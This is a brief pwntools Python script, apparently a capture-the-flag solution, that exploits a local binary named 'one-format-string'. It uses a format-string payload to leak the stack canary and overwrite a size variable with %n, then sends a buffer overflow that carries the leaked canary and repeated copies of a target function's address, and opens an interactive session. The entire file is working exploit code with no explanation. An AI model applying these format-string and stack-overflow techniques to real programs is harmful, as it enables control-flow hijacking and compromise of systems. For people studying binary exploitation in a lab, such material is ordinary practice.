#!/usr/bin/env python

from pwn import *
# import sys

p = process('./one-format-string')

# argct = sys.argv[1]

addr_please_run_this = p64(0x004006c0)
addr_max_read_size = p64(0x00601060)

# buf = "%23$p %200x%"+argct+"$n"+addr_max_read_size

buf = "%23$p %200x%13$n"+addr_max_read_size
p.sendline(buf)

a = p.recv(22)

canary = p64(int(p.recv(20), 16))

buf = "A"*72 + canary + addr_please_run_this*50

p.sendline(buf)

p.interactive()
